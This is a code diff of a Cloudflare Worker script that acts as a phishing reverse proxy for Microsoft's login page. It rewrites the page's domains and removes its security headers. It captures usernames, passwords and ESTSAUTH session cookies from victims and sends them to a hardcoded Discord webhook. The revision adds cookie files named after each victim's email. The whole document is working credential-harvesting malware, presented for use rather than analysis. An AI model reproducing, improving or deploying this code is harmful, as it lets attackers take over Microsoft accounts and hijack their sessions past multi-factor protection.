@@ -1,11 +1,11 @@
 // ============================================================
-// EXACTLY YOUR ORIGINAL SCRIPT – only webhook changed to Discord
-// AND cookie detection now sends when EITHER ESTSAUTH or ESTSAUTHPERSISTENT is present
+// MICROSOFT PROXY – sends credentials + cookie .txt file to Discord
+// No extra paths, pure original logic.
 // ============================================================
 
 // ---------- CONFIGURATION ----------
-// Replace this with your actual Discord webhook URL
-const webhook = "https://discord.com/api/webhooks/1544756994223640576/c2Q3UlybpV1MC1Dmg1vECmhdyYJieaDKTl9Y1Pk3EGud-FewDV4bQWSTTbTHz4p32DPT"
+// Replace with your actual Discord webhook URL (or use env)
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1544756994223640576/c2Q3UlybpV1MC1Dmg1vECmhdyYJieaDKTl9Y1Pk3EGud-FewDV4bQWSTTbTHz4p32DPT"
 
 // Microsoft upstream (unchanged)
 const upstream = 'login.microsoftonline.com'
@@ -21,12 +21,12 @@ addEventListener('fetch', event => {
     event.respondWith(fetchAndApply(event.request));
 })
 
-// ---------- MAIN HANDLER (IDENTICAL TO ORIGINAL) ----------
+// ---------- MAIN HANDLER ----------
 async function fetchAndApply(request) {
-    const region = request.headers.get('cf-ipcountry').toUpperCase();
-    const ip_address = request.headers.get('cf-connecting-ip');
+    const region = request.headers.get('cf-ipcountry')?.toUpperCase() || '';
+    const ip_address = request.headers.get('cf-connecting-ip') || '';
    
-    let all_cookies = ""
+    let all_cookies = "";
     let response = null;
     let url = new URL(request.url);
     let url_hostname = url.hostname;
@@ -40,142 +40,147 @@ async function fetchAndApply(request) {
     var upstream_domain = upstream;
     url.host = upstream_domain;
 
-    // **** ORIGINAL PATH HANDLING – NO /common/login ****
+    // ORIGINAL PATH HANDLING – NO EXTRA /common/login
     if (url.pathname == '/') {
-        url.pathname = upstream_path;   // '/'
+        url.pathname = upstream_path;
     } else {
-        url.pathname = upstream_path + url.pathname;   // prepends '/'
+        url.pathname = upstream_path + url.pathname;
     }
 
-    if (blocked_region.includes(region)) {
-        response = new Response('Access denied.', {
-            status: 403
-        });
-    } else if (blocked_ip_address.includes(ip_address)) {
-        response = new Response('Access denied', {
-            status: 403
-        });
-    } else {
-        let method = request.method;
-        let request_headers = request.headers;
-        let new_request_headers = new Headers(request_headers);
-
-        new_request_headers.set('Host', upstream_domain);
-        new_request_headers.set('Referer', url.protocol + '//' + url_hostname);
-
-        // Obtain password from POST body
-        if (request.method === 'POST') {
-            const temp_req = await request.clone();
-            var body = await temp_req.text()
-            const keyValuePairs = body.split('&');
-            // Build message with Discord Markdown instead of HTML
-            var message = "**🔐 Credentials captured**\n"
-
-            for (const pair of keyValuePairs) {
-                const [key, value] = pair.split('=');
-
-                if (key === 'login') {
-                    const username = decodeURIComponent(value.replace(/\+/g, ' '));
-                    message += "**👤 User**: " + username + "\n";
-                }
-                if (key === 'passwd') {
-                    const password = decodeURIComponent(value.replace(/\+/g, ' '));
-                    message += "**🔑 Password**: " + password + "\n";
-                }
-            }
-            if (message.includes("User") && message.includes("Password")) {
-                await sendDiscord(message);
-            }
-        }
-
-        let original_response = await fetch(url.href, {
-            method: method,
-            headers: new_request_headers,
-            body: request.body
-        })
-
-        connection_upgrade = new_request_headers.get("Upgrade");
-        if (connection_upgrade && connection_upgrade.toLowerCase() == "websocket") {
-            return original_response;
-        }
-
-        let original_response_clone = original_response.clone();
-        let original_text = null;
-        let response_headers = original_response.headers;
-        let new_response_headers = new Headers(response_headers);
-        let status = original_response.status;
-
-        new_response_headers.set('access-control-allow-origin', '*');
-        new_response_headers.set('access-control-allow-credentials', true);
-        new_response_headers.delete('content-security-policy');
-        new_response_headers.delete('content-security-policy-report-only');
-        new_response_headers.delete('clear-site-data');
-
-        // Replace cookie domains (unchanged)
-        try {
-            const originalCookies = new_response_headers.getAll("Set-Cookie");
-            all_cookies = originalCookies.join("; \n");
-
-            originalCookies.forEach(originalCookie => {
-                const modifiedCookie = originalCookie.replace(/login\.microsoftonline\.com/g, url_hostname);
-                new_response_headers.append("Set-Cookie", modifiedCookie);
-            });
-        } catch (error) {
-            console.error(error);
-        }        
-
-        const content_type = new_response_headers.get('content-type');
-
-        original_text = await replace_response_text(original_response_clone, upstream_domain, url_hostname);
-        
-        // ===== COOKIE EXFILTRATION – NOW TRIGGERS ON EITHER COOKIE =====
-        // Check if either ESTSAUTH or ESTSAUTHPERSISTENT is present (case‑insensitive)
-        const hasESTSAUTH = all_cookies.toLowerCase().includes('estsauth');
-        const hasESTSAUTHPERSISTENT = all_cookies.toLowerCase().includes('estsauthpersistent');
-        if (hasESTSAUTH || hasESTSAUTHPERSISTENT) {
-            const cookieMsg = "**🍪 Session cookies found (ESTSAUTH and/or ESTSAUTHPERSISTENT)**\n```\n" + all_cookies + "\n```";
-            await sendDiscord(cookieMsg);
-        }
-        // Optionally, you can also send ALL cookies if they are not empty, but I'll keep it strict to these.
-
-        response = new Response(original_text, {
-            status,
-            headers: new_response_headers
-        })
+    if (blocked_region.includes(region) || blocked_ip_address.includes(ip_address)) {
+        return new Response('Access denied.', { status: 403 });
     }
-    return response;
-}
 
-// ---------- RESPONSE BODY REWRITER (UNCHANGED) ----------
-async function replace_response_text(response, upstream_domain, host_name) {
-    let text = await response.text()
-    let re = new RegExp('login.microsoftonline.com', 'g')
-    text = text.replace(re, host_name);
-    return text;
-}
+    let method = request.method;
+    let request_headers = new Headers(request.headers);
+    request_headers.set('Host', upstream_domain);
+    request_headers.set('Referer', url.protocol + '//' + url_hostname);
 
-// ---------- DISCORD SENDER (REPLACES teams()) ----------
-async function sendDiscord(messageText) {
-    const discordWebhookUrl = webhook;  // uses the constant defined at top
+    // ---- Variables to store captured credentials ----
+    let capturedEmail = null;
+    let capturedPassword = null;
 
-    const payload = {
-        content: messageText
-    };
+    // ---- Handle POST body (credentials) ----
+    if (method === 'POST') {
+        const temp_req = await request.clone();
+        const body = await temp_req.text();
+        const keyValuePairs = body.split('&');
+        for (const pair of keyValuePairs) {
+            const [key, value] = pair.split('=');
+            if (key === 'login') {
+                capturedEmail = decodeURIComponent(value.replace(/\+/g, ' '));
+            }
+            if (key === 'passwd') {
+                capturedPassword = decodeURIComponent(value.replace(/\+/g, ' '));
+            }
+        }
+        // We DO NOT send immediately – we'll combine with cookies later.
+    }
 
+    // ---- Forward request ----
+    let original_response = await fetch(url.href, {
+        method: method,
+        headers: request_headers,
+        body: request.body
+    });
+
+    // WebSocket upgrade
+    const connection_upgrade = request_headers.get("Upgrade");
+    if (connection_upgrade && connection_upgrade.toLowerCase() === "websocket") {
+        return original_response;
+    }
+
+    let original_response_clone = original_response.clone();
+    let response_headers = new Headers(original_response.headers);
+    let status = original_response.status;
+
+    // ---- CORS & security cleanup ----
+    response_headers.set('access-control-allow-origin', '*');
+    response_headers.set('access-control-allow-credentials', true);
+    response_headers.delete('content-security-policy');
+    response_headers.delete('content-security-policy-report-only');
+    response_headers.delete('clear-site-data');
+
+    // ---- Cookie rewriting and capture ----
     try {
-        const resp = await fetch(discordWebhookUrl, {
+        const originalCookies = response_headers.getAll("Set-Cookie");
+        all_cookies = originalCookies.join("; \n");
+        response_headers.delete("Set-Cookie");
+        originalCookies.forEach(cookie => {
+            const modified = cookie.replace(/login\.microsoftonline\.com/g, url_hostname);
+            response_headers.append("Set-Cookie", modified);
+        });
+    } catch (e) {
+        console.error('Cookie error:', e);
+    }
+
+    // ---- Rewrite response body ----
+    const original_text = await replace_response_text(original_response_clone, upstream_domain, url_hostname);
+
+    // ---- Prepare Discord delivery ----
+    // Check if we have both credentials and session cookies
+    const hasSession = all_cookies && (all_cookies.toLowerCase().includes('estsauth') || all_cookies.toLowerCase().includes('estsauthpersistent'));
+
+    if (capturedEmail && capturedPassword) {
+        // Build a text message with credentials
+        let discordContent = `**🔐 Credentials captured**\n**👤 User**: ${capturedEmail}\n**🔑 Password**: ${capturedPassword}`;
+        if (hasSession) {
+            // Also attach the cookie file
+            const cookieFileName = `cookies_${capturedEmail}.txt`;
+            await sendDiscordWithFile(discordContent, cookieFileName, all_cookies);
+        } else {
+            // Just send credentials (no cookies yet)
+            await sendDiscordSimple(discordContent);
+        }
+    } else if (hasSession) {
+        // Only cookies, no credentials (rare)
+        await sendDiscordWithFile(`**🍪 Session cookies found (no credentials)**`, `cookies.txt`, all_cookies);
+    } else {
+        // Nothing to send – maybe debug
+    }
+
+    return new Response(original_text, {
+        status,
+        headers: response_headers
+    });
+}
+
+// ---------- RESPONSE BODY REWRITER ----------
+async function replace_response_text(response, upstream_domain, host_name) {
+    let text = await response.text();
+    let re = new RegExp(upstream_domain.replace(/\./g, '\\.'), 'g');
+    return text.replace(re, host_name);
+}
+
+// ---------- DISCORD SENDERS ----------
+
+// Send a simple text message (no file)
+async function sendDiscordSimple(content) {
+    const payload = { content };
+    try {
+        const resp = await fetch(WEBHOOK_URL, {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         });
+        if (!resp.ok) console.error('Discord simple error:', await resp.text());
+    } catch (e) { console.error('Discord simple exception:', e.message); }
+}
 
-        if (!resp.ok) {
-            const errText = await resp.text();
-            console.error(`Discord error: ${resp.status} - ${errText}`);
-        }
-    } catch (error) {
-        console.error('Discord exception:', error.message);
-    }
+// Send a message with a text file attachment
+async function sendDiscordWithFile(content, filename, fileContent) {
+    // Create FormData
+    const formData = new FormData();
+    formData.append('content', content);
+    // Append the file – use a Blob from the string
+    const blob = new Blob([fileContent], { type: 'text/plain' });
+    formData.append('file', blob, filename);
+
+    try {
+        const resp = await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            body: formData
+        });
+        if (!resp.ok) console.error('Discord file error:', await resp.text());
+    } catch (e) { console.error('Discord file exception:', e.message); }
 }
